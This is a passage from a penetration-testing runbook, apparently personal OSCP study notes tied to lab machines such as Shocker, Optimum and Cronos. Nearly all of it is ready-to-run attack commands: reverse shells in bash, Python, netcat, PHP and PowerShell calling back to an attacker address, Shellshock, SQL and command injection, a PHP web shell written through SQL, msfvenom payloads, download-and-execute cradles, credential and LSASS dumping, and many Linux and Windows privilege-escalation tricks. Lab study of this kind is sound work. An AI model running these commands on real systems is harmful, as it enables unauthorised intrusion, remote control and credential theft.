curl -sS -G --data-urlencode 'cmd=sed -n "1,240p" /home/guly/check_attack.php' "http://$BoxIP/$Path"

# Networked: a controlled filename marker for unquoted cron command injection
echo 'x;touch${IFS}networked_pwned' > "$File"

# Staging the marker locally is not enough: the string must become the remote filename through the confirmed upload/webshell path.
# Bash callback through a PHP web shell; start the listener first
nc -lvnp $Lport

curl -sS -X POST --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/$LocalIP/$Lport 0>&1'" "http://$BoxIP/$Path" >/dev/null

# OpenNetAdmin 18.1.1 xajax command injection, with markers for XML output parsing
curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";id;echo \"END\"&xajaxargs[]=ping" "http://$BoxIP/ona/" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1

# Confirm blind execution by watching for a callback ping
sudo tcpdump -ni tun0 "icmp and host $BoxIP"

curl -G "http://$BoxIP/$Path" --data-urlencode "cmd=ping -c 1 $LocalIP"

# Test a loopback-only endpoint through a forwarded local port
curl -G "http://127.0.0.1:$LocalPort/$Path" --data-urlencode "log_file=/etc/passwd;id;#"

# Bypass an incomplete blacklist with command substitution through a sudo-allowed script
printf '%s\n' '127.0.0.1\$(bash /tmp/rev.sh)' | sudo -u $Username2 $SudoScript -p
```

### APACHE CGI SHELLSHOCK

~~~bash
# Confirm the CGI script responds normally before testing the header parser.
curl -si "http://$BoxIP:$WebPort/cgi-bin/$Script"

# Enumerate files below a CGI directory even when the directory listing is forbidden.
gobuster dir -u "http://$BoxIP:$WebPort/cgi-bin/" \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x sh,cgi,pl,py \
  -o "$BoxDir/loot/gobuster-cgi.txt"

# Prove Shellshock with a harmless identity command through the User-Agent header.
curl -si "http://$BoxIP:$WebPort/cgi-bin/$Script" \
  -H 'User-Agent: () { :; }; echo; echo; /usr/bin/id'

# Start the Kali listener before sending the callback request.
nc -lvnp "$Lport"

# Send a Bash callback only after the identity proof succeeds.
curl --max-time 10 -si "http://$BoxIP:$WebPort/cgi-bin/$Script" \
  -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/$LocalIP/$Lport 0>&1"

# Stabilise a raw callback in the local terminal, then press Enter once after fg.
stty raw -echo

fg

# Confirm the received identity and host.
id

whoami

hostname
~~~

> [!warning] 💡 CGI gotchas
> A 403 directory response does not rule out a directly reachable CGI file. A timeout after the callback begins can be normal because the CGI process is attached to the shell. Keep $WebPort and $Lport distinct, and run reset locally if stty leaves the terminal garbled.

See [[RUNBOOK V2/Linux - Shellshock CGI|Linux - Shellshock CGI]] and [[OSCP/BOXES/WRITE UPS/Linux/Shocker|Shocker]].

### Stored browser callbacks

```bash
# Serve a harmless JavaScript marker and record administrator-bot requests
python3 -m http.server $ListenPort --directory $BoxDir/www

curl -s http://$LocalIP:$ListenPort/malicious.js

grep malicious.js $BoxDir/loot/callback.log
```

### SSRF, IDOR & request replay

```bash
# Confirm an SSRF parameter with a harmless local request first.
curl -sS -G "http://$BoxIP/$Path" \
  --data-urlencode "url=http://127.0.0.1:$InternalPort/" \
  | tee "$BoxDir/loot/ssrf-loopback.txt"

# Test a cloud metadata endpoint only when the target context makes it relevant.
curl -sS -G "http://$BoxIP/$Path" \
  --data-urlencode 'url=http://169.254.169.254/latest/meta-data/'

# Replay an authorised request with a changed object identifier.
curl -sS -b "$CookieFile" \
  "http://$BoxIP/api/$ObjectType/$ObjectID" \
  -o "$BoxDir/loot/idor-$ObjectID.json"

# Enumerate a bounded range and preserve response metadata for comparison.
for ObjectID in $(seq "$StartID" "$EndID"); do
  curl -sS -o "$BoxDir/loot/idor-$ObjectID.body" \
    -w "id=$ObjectID status=%{http_code} bytes=%{size_download}\n" \
    -b "$CookieFile" "http://$BoxIP/api/$ObjectType/$ObjectID"

done | tee "$BoxDir/loot/idor-summary.txt"

# Replay the browser request while changing one field at a time.
curl -sS -X "$Method" -H "$Header" -b "$CookieFile" \
  --data-binary @"$RequestBody" "http://$BoxIP/$Path"
```

> [!warning] 💡 SSRF/IDOR gotcha
> A different status code is only a lead. Compare response length and body, keep the request authenticated when required, and bound enumeration to the smallest range that proves the access-control decision.

### CRONOS: AXFR, VIRTUAL HOST, SQLI, COMMAND INJECTION, AND ROOT CRON

```bash
# Discover hostnames from a DNS zone transfer
dig axfr "$Domain" @"$BoxIP"

# Test a confirmed virtual host without changing /etc/hosts
curl -sSI --resolve "$FQDN:$WebPort:$BoxIP" "http://$FQDN/"

# Submit a manually reviewed SQL injection authentication test
curl -sS -i -c "$CookieFile" -X POST \
  --resolve "$AdminFQDN:$WebPort:$BoxIP" \
  --data-urlencode "username=admin' OR '1'='1' -- -" \
  --data-urlencode "password=x" \
  "http://$AdminFQDN:$WebPort/"

# Prove command injection before requesting a callback
curl -sS -b "$CookieFile" \
  --resolve "$AdminFQDN:$WebPort:$BoxIP" \
  --data-urlencode "command=ping -c 1" \
  --data-urlencode "host=127.0.0.1;id" \
  "http://$AdminFQDN:$WebPort/welcome.php"

# Receive the web callback
nc -lvnp "$Port"

curl -sS --max-time 10 -b "$CookieFile" \
  --resolve "$AdminFQDN:$WebPort:$BoxIP" \
  --data-urlencode "command=ping -c 1" \
  --data-urlencode "host=127.0.0.1;bash -c 'bash -i >& /dev/tcp/$LocalIP/$Port 0>&1'" \
  "http://$AdminFQDN:$WebPort/welcome.php" >/dev/null

# Confirm a root-run cron target and preserve its original bytes
cat /etc/crontab

ls -la /var/www/laravel/artisan

cp -p /var/www/laravel/artisan /tmp/artisan.backup

# Generate the target-side edit locally so the callback address is expanded on Kali
printf "sed -i '2a system(\"bash -c '\\''bash -i >& /dev/tcp/%s/%s 0>&1'\\''\");' /var/www/laravel/artisan\n" "$LocalIP" "$Port2"

php -l /var/www/laravel/artisan

# Restore only after the root proof, then verify syntax and close listeners
cp -p /tmp/artisan.backup /var/www/laravel/artisan

rm -f /tmp/artisan.backup

php -l /var/www/laravel/artisan

ss -ltnp | grep -E ":$Port|:$Port2" || true
```

The important controls are manual SQLi confirmation, an id proof before the callback, a backup before editing the scheduled file, and restoration after the root proof.

### Database command-execution patterns

```sql
-- PostgreSQL: confirm the current role before using COPY ... PROGRAM.
SELECT current_user, version();

COPY (SELECT '') TO PROGRAM 'id > /tmp/db-id.txt';

-- MySQL: check FILE and secure_file_priv before attempting a web-root write.
SELECT user(), @@secure_file_priv;

SELECT LOAD_FILE('/etc/passwd');

SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- MSSQL: use xp_cmdshell only when the authenticated account is authorised.
EXEC xp_cmdshell 'whoami';

EXEC master..xp_dirtree '\\\\$LocalIP\\\\share', 1, 1;
```

```bash
# MSSQL from Kali: authenticate with Windows auth when the target requires it.
impacket-mssqlclient "$Domain/$Username:$Password@$BoxIP" -windows-auth

# Inside mssqlclient: SELECT name FROM master..sysdatabases; EXEC xp_cmdshell 'whoami';

# Blind SQLi timing proof: make the delay clearly distinguishable from baseline.
time curl -sS -X POST "http://$BoxIP/$Path" \
  --data-urlencode "${Parameter}=1;SELECT SLEEP(5)#" -o /dev/null
```

## 5. FOOTHOLD: PUBLIC EXPLOITS

### Drupal 7.54 / Drupalgeddon2

```bash
# Confirm the public version disclosure and locate the matching PoC
curl -sS "http://$BoxIP/CHANGELOG.txt" | grep -m1 "Drupal"

searchsploit "Drupal 7"

searchsploit -x php/webapps/44449.rb

# Copy, minimally adapt, and syntax-check the reviewed Ruby PoC
boxset ExploitFile "$BoxDir/exploits/44449.rb"

cp /usr/share/exploitdb/exploits/php/webapps/44449.rb "$ExploitFile"

sed -i "/require 'highline\/import'/d" "$ExploitFile"

sed -i 's/try_phpshell = true/try_phpshell = false/' "$ExploitFile"

ruby -c "$ExploitFile"

ruby "$ExploitFile" "http://$BoxIP/"
```

### Rejetto HttpFileServer 2.3 / CVE-2014-6287

```bash
# Fingerprint HFS and locate the matching public proof.
sudo nmap -Pn -n -sC -sV -p "$WebPort" "$BoxIP" -oA "$BoxDir/nmap/services"

curl -sS -i "http://$BoxIP:$WebPort/" | tee "$BoxDir/loot/http-root.txt"

searchsploit "Rejetto HttpFileServer 2.3"

searchsploit -x 49125

cp /usr/share/exploitdb/exploits/windows/webapps/49125.py "$BoxDir/exploits/49125.py"

python3 -m py_compile "$BoxDir/exploits/49125.py"
```

```bash
# Serve a reviewed callback and start the listener before the trigger.
python3 -m http.server "$TransferPort" --directory "$BoxDir/www"

nc -lvnp "$CallbackPort"

# The HFS PoC URL-encodes the command and places it in the search parameter.
HfsCommand="powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://$LocalIP:$TransferPort/shell.ps1')\""

python3 "$BoxDir/exploits/49125.py" "$BoxIP" "$WebPort" "$HfsCommand"
```

> [!warning] 💡 HFS gotcha
> A successful HFS request does not prove a shell. Confirm the file-server access log, receive the callback, and run `whoami` before local enumeration. Keep the HFS port, transfer port, and callback port separate.

See [[OSCP/BOXES/WRITE UPS/Windows/Optimum|Optimum]], [[RUNBOOK V2/Windows - Exploit Search]], and [[COMMAND BREAKDOWNS/Web Applications (Breakdowns)|Web application breakdowns]].

```bash
# Search by product and version
searchsploit $Service $Version

# Read a matching exploit
searchsploit -x $ExploitPath

python3 $Exploit $BoxIP $Port $Command

perl $Exploit $BoxIP

# Copy an Exploit-DB entry directly
searchsploit -m $ExploitID

searchsploit -p $ExploitID

searchsploit -x $ExploitPath

# Compile a local C exploit
gcc $Exploit.c -o $Exploit

# Run a Python proof of concept after reviewing and setting its variables
python3 $BoxDir/$Exploit.py $BoxIP $Port

# Authenticated Magento object-injection RCE; validate with an identity command first
python3 $BoxDir/exploits/magento_rce_py3.py id
```

### Payload generation, BOF support and foreign binaries

```bash
# Generate a stageless Windows shell payload for a reviewed manual exploit.
msfvenom -p windows/shell_reverse_tcp LHOST="$LocalIP" LPORT="$Port" \
  EXITFUNC=thread -f exe -o "$BoxDir/www/shell.exe"

# Generate shellcode with bad characters excluded from the vulnerable transport.
msfvenom -p windows/shell_reverse_tcp LHOST="$LocalIP" LPORT="$Port" \
  EXITFUNC=thread -f c -e x86/shikata_ga_nai \
  -b '\x00\x0a\x0d\x25\x26\x2b\x3d'

# Generate a raw payload for a fixed-layout 32-bit overflow.
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp \
  LHOST="$LocalIP" LPORT="$Port" EXITFUNC=thread \
  -b '\x00\x0a\x0d' -f raw -o "$BoxDir/exploits/shellcode.bin"

# Find an offset and inspect the target binary before changing a public PoC.
msf-pattern_create -l "$PatternLength"

msf-pattern_offset -l "$PatternLength" -q "$EipValue"

file "$BoxDir/loot/$File"

checksec --file="$BoxDir/loot/$File"

# Cross-compile a reviewed Windows C proof of concept.
i686-w64-mingw32-gcc "$BoxDir/exploits/exploit.c" -o "$BoxDir/exploits/exploit.exe" -lws2_32

# Run a PE proof locally under Wine when local validation is required.
wine "$BoxDir/exploits/exploit.exe"

# Shellter modifies a reviewed 32-bit PE; use its interactive menu with the matching handler.
file "$PayloadFile"

shellter
```

> [!warning] 💡 Exploit gotcha
> Payload naming matters: `windows/shell/reverse_tcp` is staged and needs a matching Metasploit handler; `windows/shell_reverse_tcp` is stageless and can use a plain listener. Confirm the payload name before troubleshooting a missing callback.

### Service-specific manual checks

```bash
# Read the SMTP banner before searching for a matching parser exploit
nc -nv $BoxIP 25

# Search for OpenSMTPD or Sendmail version-specific exploit references
searchsploit OpenSMTPD $Version

searchsploit Sendmail $Version

# Inspect a proof of concept before changing its callback and target values
sed -n '1,220p' $BoxDir/exploit.py

# Launch a reviewed Python 2 service exploit when the target requires it
python2 $BoxDir/exploit.py $BoxIP $Port
```

### Metasploit and Meterpreter quick control

```bash
# Start the framework only when the route calls for it; record the module and options.
msfconsole -q

# Use a matching handler for a staged payload.
use exploit/multi/handler

set PAYLOAD windows/shell/reverse_tcp

set LHOST "$LocalIP"

set LPORT "$Port"

run
```

```text
# Common Meterpreter session commands.
sessions -l

sessions -i $SessionID

getuid

sysinfo

shell

background

getsystem

migrate $PID

load kiwi

creds_all

portfwd add -l $LocalPort -p $InternalPort -r $InternalIP
```

> [!warning] 💡 Handler gotcha
> Match the handler payload, callback address, and port exactly. A staged payload needs the handler; a stageless payload can use a plain listener. Close sessions and listeners during cleanup.

### Custom PE stack overflow

```bash
# Run a leaked 32-bit PE server locally under Wine for crash analysis
wine $BoxDir/loot/$File

# Generate a cyclic pattern and calculate the exact EIP overwrite offset
msf-pattern_create -l $PatternLength

msf-pattern_offset -l $PatternLength -q $EipValue

# Confirm the PE image base and search the target binary for stack redirection gadgets
objdump -p $BoxDir/loot/$File | grep ImageBase

ROPgadget --binary $BoxDir/loot/$File | grep -E 'push esp ; ret$|call esp ; ret$|jmp esp$'

# Send a reviewed binary exploit to a one-shot service; terminate its message as required
python3 $BoxDir/loot/$Exploit.py $BoxIP $Port
```

> Use a null-free Linux x86 payload when a PE server runs under Wine on a Linux target. Keep the service socket open during shell startup when the payload depends on the triggering connection.

### Custom SUID adjacent-string overwrite

```bash
# Locate the helper, review readable source, and inspect native ELF metadata
find / -type f -perm -4000 -printf '%M %u %g %p\n' 2>/dev/null | sort

sed -n '1,160p' $SourceFile

checksec --file=$SuidPath

readelf -h -l -s $SuidPath

objdump -d -M intel $SuidPath

# Source-derived layout: five accepted bytes, fifteen padding bytes, then a NUL-terminated shell path
(printf 'SimonAAAAAAAAAAAAAAA/bin/sh\0\n'; cat) | $SuidPath

id
```

> This Covfefe path overwrites a local string consumed by `execve()`. It is a buffer-overwrite exploit, but not a saved-return-address, shellcode, or ROP exploit.

## 6. FOOTHOLD: SHELLS & PAYLOADS

```bash
# Linux reverse shells
bash -i >& /dev/tcp/$LocalIP/$Lport 0>&1

python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$LocalIP",$Lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

nc -e /bin/sh $LocalIP $Lport

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LocalIP $Lport >/tmp/f

# Start a simple HTTP server for payload transfer
python3 -m http.server $WebPort --directory $BoxDir/www

php -r '$s=fsockopen("$LocalIP",$Lport);exec("/bin/sh -i <&3 >&3 2>&3");'

# Listener and TTY upgrade
nc -lvnp $Lport

nc -lnvp $Lport

sudo nc -lvnp $Lport

python3 -c 'import pty;pty.spawn("/bin/bash")'

# Ctrl+Z, then:
stty raw -echo

fg

# Press Enter twice
export TERM=xterm

stty rows 50 columns 200

# Legacy SSH server
ssh -oHostKeyAlgorithms=ssh-rsa -oKexAlgorithms=+diffie-hellman-group1-sha1,diffie-hellman-group14-sha1 -oMACs=+hmac-md5,hmac-sha1 $Username@$BoxIP

# Windows PowerShell reverse shell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client=New-Object System.Net.Sockets.TCPClient('$LocalIP',$Lport);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendbyte=([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Generate a 32-bit stageless Windows shell executable for a 32-bit target
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp \
  LHOST=$LocalIP LPORT=$Lport EXITFUNC=thread \
  -b '\x00\x0a\x0d' -f exe -o $BoxDir/www/$File
```

## 7. FILE TRANSFERS

### Linux to Windows

```bash
# Kali server
cd $BoxDir/www

python3 -m http.server $WebPort

wget http://$LocalIP/$File -O $File
```

```cmd
certutil -urlcache -split -f http://$LocalIP/$File $File

powershell -Command "Invoke-WebRequest -Uri http://$LocalIP/$File -OutFile $File"
```

### Windows to Linux

```bash
# Kali SMB server
mkdir /tmp/share

impacket-smbserver share /tmp/share -smb2support -username $Username -password $Password
```

```cmd
net use \\$LocalIP\share /user:$Username $Password

copy $File \\$LocalIP\share\$File

Copy-Item \\$LocalIP\share\$File C:\Users\$Username\Desktop\$File

Expand-Archive .\archive.zip -DestinationPath C:\Temp\$Directory -Force

Start-BitsTransfer -Source http://$LocalIP/$File -Destination C:\Temp\$File

# Transfer files through an authenticated Evil-WinRM session
upload $File

download $File
```

### Raw Netcat Transfer

```bash
nc -lvnp $Lport < $File

nc -nv $BoxIP $Lport > $File

base64 -w0 $File

echo "$Encoded" | base64 -d > $File
```

```bash
# Upload a file through anonymous FTP to a web root
curl --upload-file $BoxDir/www/$File ftp://$BoxIP/$RemoteFile
```

### Alternate transfer methods

```powershell
# Download to disk with the native .NET client.
(New-Object Net.WebClient).DownloadFile("http://$LocalIP/$File", "C:\Windows\Temp\$File")

# Download and execute a reviewed script in memory.
IEX (New-Object Net.WebClient).DownloadString("http://$LocalIP/$ScriptFile")

# Background transfer when the target can reach the attacker over HTTP.
Start-BitsTransfer -Source "http://$LocalIP/$File" -Destination "C:\Windows\Temp\$File"

# Invoke-RestMethod for text or JSON responses.
Invoke-RestMethod -Uri "http://$LocalIP/$Path" -OutFile "C:\Windows\Temp\$File"

# Legacy BITSAdmin fallback.
bitsadmin /transfer job /download /priority normal "http://$LocalIP/$File" "C:\Windows\Temp\$File"
```

```bash
# Python upload server for a target-side POST or PUT client.
python3 -m pip install --user uploadserver

python3 -m uploadserver 8000 --directory "$BoxDir/www"

# RDP with a local drive mapped into the session.
xfreerdp /v:"$BoxIP" /u:"$Username" /p:"$Password" \
  /drive:loot,"$BoxDir/loot" /cert:ignore
```

> [!warning] 💡 Transfer gotcha
> The target must be able to reach `$LocalIP`, and a firewall may allow HTTP but block SMB. Verify the file hash after transfer and use a separate listener port from the web server when callbacks are involved.

## 8. POST-EXPLOITATION: LINUX

```bash
id

whoami

hostname

ip a

ss -lntp

ps aux

find / -type f -name '*.conf' 2>/dev/null

grep -RniE 'password|passwd|secret|token' /var/www /opt /home 2>/dev/null

cat /etc/passwd

cat /etc/shadow 2>/dev/null

mysql -u $Username -p$Password -h 127.0.0.1 -P $Port

psql -h 127.0.0.1 -p $Port -U $Username -d $Database

gcore $PID

sudo gcore $PID

strings core.$PID | grep -A 1 "Password:"

# Find root processes, dump one allowed process, and search the dump for secrets
ps aux | grep root

sudo gcore $PID

strings core.$PID | grep -iE 'password|passwd|secret|token'

# Inspect a disclosed Java application archive offline
file "$BoxDir/loot/$File"

jar tf "$BoxDir/loot/$File" | tee "$BoxDir/loot/$File.contents.txt"

javap -classpath "$BoxDir/loot/$File" -c -p "$ClassName" \
  | tee "$BoxDir/loot/$ClassName.javap.txt"

grep -Ein 'user|username|pass|password|secret|token|jdbc|mysql|postgres|localhost' \
  "$BoxDir/loot/$ClassName.javap.txt"

# Check whether the passwd file is writable
ls -la /etc/passwd

# Generate a portable password hash for a controlled UID-0 entry
openssl passwd -1 $Password
```

### Linux enumeration and credential hunting add-ons

```bash
# Transfer and run the standard enumeration helpers from a controlled Kali server.
curl -fsS "http://$LocalIP/linpeas.sh" -o /tmp/linpeas.sh

chmod +x /tmp/linpeas.sh

/tmp/linpeas.sh | tee "$BoxDir/loot/linpeas.txt"

curl -fsS "http://$LocalIP/unix-privesc-check" -o /tmp/unix-privesc-check

chmod +x /tmp/unix-privesc-check

/tmp/unix-privesc-check standard | tee "$BoxDir/loot/unix-privesc-check.txt"

# Routing, packages, containers, and kernel/module context.
which routel && routel

ip route

dpkg -l 2>/dev/null || rpm -qa 2>/dev/null

docker ps -a 2>/dev/null

id

getent group docker lxd adm disk 2>/dev/null

aa-status 2>/dev/null

find /lib/modules/$(uname -r) -type f -name '*.ko*' 2>/dev/null | head

# Search logs and user-controlled files without dumping unrelated sensitive data.
find /var/log /home /opt /var/www -type f -readable 2>/dev/null \
  -exec grep -HniE 'password|passwd|secret|token|credential' {} + \
  | tee "$BoxDir/loot/linux-credential-hits.txt"
```

> [!warning] 💡 Local-enum gotcha
> Tools are triage, not proof. Read the script output, reproduce the permission boundary manually, and record the exact file owner, group, mode, capability, or container membership that makes a path viable.

## 9. POST-EXPLOITATION: WINDOWS

```cmd
whoami /all

whoami /priv

whoami /groups

hostname

systeminfo

ipconfig /all

route print

netstat -ano

tasklist /v

net user

net localgroup

cmdkey /list

wevtutil qe Security /rd:true /f:text | Select-String password

procdump.exe -accepteula -ma lsass.exe lsass.dmp

impacket-secretsdump -sam sam.bak -system system.bak LOCAL

findstr /si password *.txt *.xml *.config

reg query HKLM /f password /t REG_SZ /s
```

```powershell
Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue

Get-ChildItem C:\Users\ -Recurse -Include *.kdbx,*.rdg,*.vnc,*.rdp,*.cred,*.bak -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\Users\ -Recurse -Include *.txt,*.ini,*.cfg,*.config,*.xml,*.log -ErrorAction SilentlyContinue | Select-String -Pattern "password","pass","secret"

cmdkey /list
```

### Windows credential and policy triage add-ons

```powershell
# Local users, descriptions, and AppLocker policy.
Get-LocalUser | Select-Object Name,Enabled,Description,LastLogon

Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections

Get-AppLockerPolicy -Effective -Xml | Out-File "$env:TEMP\applocker.xml"

# Saved sessions and browser material when the current account can access it.
cmdkey /list

Invoke-SessionGopher -Thorough

Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue

# Scheduled tasks, services, and registry locations worth checking.
Get-ScheduledTask | Select-Object TaskName,TaskPath,State,@{N='Execute';E={$_.Actions.Execute}},@{N='User';E={$_.Principal.UserId}}

Get-CimInstance Win32_Service | Select-Object Name,StartName,State,PathName

Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' | Select-Object AutoAdminLogon,DefaultUserName,DefaultDomainName,DefaultPassword
```

> [!warning] 💡 Windows triage gotcha
> A readable credential store is not automatically a usable credential. Record the account scope, validate it against the least invasive available service, and avoid exposing plaintext values in screenshots or shared notes.

## 10. PRIVILEGE ESCALATION: LINUX

```bash
sudo -l

# If the listing grants all commands, validate the direct boundary first
sudo -i

id

whoami

# Non-interactive sudo listing for scripts that do not require a password
sudo -n -l

# Read a sudo-allowed configuration generator and its privileged consumer
sed -n '1,240p' $SudoScript

grep -RniE 'source|\. |ifup|ifdown|systemctl|service|eval|exec|echo.*\$' $SudoScript /usr/local/sbin 2>/dev/null

# Networked-style prompt sequence, only after confirming the script and sourced helper
# Inputs: x, x, x, dhcp /bin/bash
find / -perm -4000 -type f 2>/dev/null

find / -perm -2000 -type f 2>/dev/null

getcap -r / 2>/dev/null

cat /etc/crontab

# User-specific crontab locations are worth checking after a web foothold
find /home -maxdepth 2 -type f \( -name 'crontab.*' -o -name '*cron*' \) -ls 2>/dev/null

cat /etc/passwd

cat /etc/shadow 2>/dev/null

uname -a

searchsploit linux kernel $Version

# Writable scheduled script: preserve the body, prove ownership and observe output timing
find / -type f -writable 2>/dev/null | grep -E '^/(scripts|opt|etc/cron|var/www)'

cat $ScriptPath | tee "$BoxDir/loot/$ScriptName.original"

stat $ScriptPath $OutputPath

# Restore the saved script and remove any target-side test helper after verification
openssl passwd -1 -salt $Salt $Password

dosbox -c 'mount c /etc' -c 'echo $Username ALL=(ALL) NOPASSWD: ALL > c:\sudoers' -c 'exit'

bsdtar -xOf /var/cache/pacman/pkg/sudo-$Version-x86_64.pkg.tar.zst etc/sudoers > /etc/sudoers

./$Exploit

/tmp/rootbash -p

# Create tar checkpoint option filenames for a wildcard sudo rule
touch -- '--checkpoint=1' '--checkpoint-action=exec=sh shell.sh'

echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' > shell.sh

sudo tar -cf $Archive *

# Verify the helper is SUID root and retain the privileged shell
ls -la /tmp/rootbash

/tmp/rootbash -p
```

```bash
# Sudo escape examples
# SUID systemctl editor path: execute a controlled editor as the retained effective UID
printf '%s\n' '#!/bin/sh' 'cp /bin/bash /tmp/jarvis-bash' 'chmod 4755 /tmp/jarvis-bash' > /tmp/jarvis-editor.sh

chmod +x /tmp/jarvis-editor.sh

script -qc 'SYSTEMD_EDITOR=/tmp/jarvis-editor.sh systemctl edit basic.target' /dev/null 2>&1

/tmp/jarvis-bash -p -c 'id'

/tmp/jarvis-bash -p -c 'whoami'

sudo find . -exec /bin/sh \; -quit

sudo python -c 'import pty; pty.spawn("/bin/bash")'

sudo vim -c ':!/bin/sh'

sudo less /etc/profile

!/bin/bash

# Sudo nano command escape: Ctrl+R, Ctrl+X, then execute a shell
sudo /bin/nano $SudoFile

# At nano's execute prompt: reset; sh 1>&0 2>&0
```

### PASSWORDLESS PERL INTERPRETER ESCAPE

~~~bash
# Read the exact sudo rule before attempting an interpreter escape.
sudo -n -l

# Confirm the permitted Perl path and use inline evaluation to replace it with Bash.
sudo /usr/bin/perl -e 'exec "/bin/bash";'

# Prove the new identity immediately.
id

whoami
~~~

> [!warning] 💡 Use the executable path and argument shape shown by sudo -l. The Perl escape is valid only when that exact interpreter is approved without a password.

See [[RUNBOOK V2/Linux - Sudo Check|Linux - Sudo Check]] and [[OSCP/BOXES/WRITE UPS/Linux/Shocker|Shocker]].

### Linux escalation branches: containers, filesystems, libraries and legacy kernels

```bash
# NFS: confirm a no_root_squash export before mounting it.
showmount -e "$BoxIP"

sudo mount -t nfs "$BoxIP:/share" "$MountDir"

sudo cp /bin/bash "$MountDir/rootbash"

sudo chmod +s "$MountDir/rootbash"

# Docker and LXD group checks.
id

docker images

docker run --rm -it -v /:/mnt ubuntu chroot /mnt /bin/bash

lxc image list

lxc init "$Image" "$Container" -c security.privileged=true

lxc config device add "$Container" hostroot disk source=/ path=/mnt/root recursive=true

lxc start "$Container"

lxc exec "$Container" /bin/sh

# Capabilities and AppArmor evidence.
getcap -r / 2>/dev/null

aa-status 2>/dev/null

grep -i 'apparmor="DENIED"' /var/log/syslog 2>/dev/null

# Disk/debug membership can expose raw filesystems; verify device ownership first.
id

ls -l /dev/sd* /dev/nvme* 2>/dev/null

debugfs /dev/sda1

# Logrotate race and GNU Screen checks.
screen --version

searchsploit screen 4.5

logrotate --version

searchsploit logrotten

# Legacy kernel checks before considering Dirty Pipe or a kernel PoC.
uname -a

cat /etc/os-release

searchsploit "linux kernel" "$Version"
```

```bash
# Sudo -u#-1 bypass: only relevant to vulnerable sudo versions and matching rules.
sudo --version

sudo -u#-1 "$SudoBinary"

# Dirty Pipe triage: compile only a reviewed PoC after confirming the kernel range.
gcc "$BoxDir/exploits/dirtypipe.c" -o "$BoxDir/exploits/dirtypipe"

"$BoxDir/exploits/dirtypipe"

# LD_PRELOAD/shared-object checks when sudo preserves the variable or RUNPATH is writable.
sudo -l

find "$LibraryDir" -type f -writable -ls 2>/dev/null

readelf -d "$Binary" | grep -E 'RPATH|RUNPATH|NEEDED'
```

> [!warning] 💡 Linux escalation gotcha
> Membership in `docker`, `lxd`, `disk`, or `adm` is a lead, not proof. Verify the exact device, socket, export, container image, or readable log and preserve the original state before changing anything.

## 11. PRIVILEGE ESCALATION: WINDOWS

```cmd
whoami /all

systeminfo

wmic service get name,displayname,pathname,startmode

sc.exe query type= all state= all

wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """"

icacls "C:\Path\to\service.exe"

sc.exe stop $ServiceName

sc.exe start $ServiceName
```

```powershell
Get-UnquotedService

Get-CimInstance -Class Win32_Service | Where-Object {$_.PathName -match ' ' -and $_.PathName -notmatch '"'} | Select-Object Name,PathName

Get-ModifiableServiceFile

Get-ModifiableService

Get-ScheduledTask | Select-Object TaskName,@{N="Binary";E={$_.Actions.Execute}},@{N="User";E={$_.Principal.UserId}}

Get-ScheduledTaskInfo -TaskName $TaskName

icacls "C:\Path\to\task-script.bat"

wevtutil qe Security /rd:true /f:text | Select-String user

wevtutil.exe cl $LogName

takeown /f "C:\Path\to\file.txt"

accesschk.exe -accepteula -w \\pipe\* -v
```

```cmd
copy /Y C:\Users\$Username\payload.bat C:\Path\to\task-script.bat

net localgroup administrators $Username /add

# Server Operators service binary-path abuse
sc.exe qc $ServiceName

sc.exe config $ServiceName binPath= "cmd.exe /c <command>"

sc.exe config $ServiceName binPath= "C:\Windows\system32\<original>.exe"

sc.exe qc $ServiceName

net localgroup administrators $Username /delete

# Check AlwaysInstallElevated in both required registry locations
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# AlwaysInstallElevated reverse shell MSI: both values must be 1
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=$LocalIP LPORT=$Port2 -f msi -o $BoxDir/www/system-shell.msi

nc -lvnp $Port2

msiexec /quiet /qn /i C:\Windows\Temp\system-shell.msi

# Run a process with alternate credentials when WinRM or RDP is unavailable
.\RunasCs.exe $Username2 $Password2 "cmd /c whoami"

# Test and launch JuicyPotato from a token with SeImpersonatePrivilege
$PotatoPath -z -l $PotatoPort -c $CLSID

$PotatoPath -t * -p $PayloadPath -l $PotatoPort -c $CLSID

# JuicyPotato callback through cmd.exe; keep the callback port separate from -l
$PotatoPath -l $PotatoPort -p $CmdPath \
  -a "/c $NcPath $LocalIP $Port2 -e cmd.exe" \
  -t * -c $CLSID
```

### Old Windows patch triage: Sherlock and MS16-098

```powershell
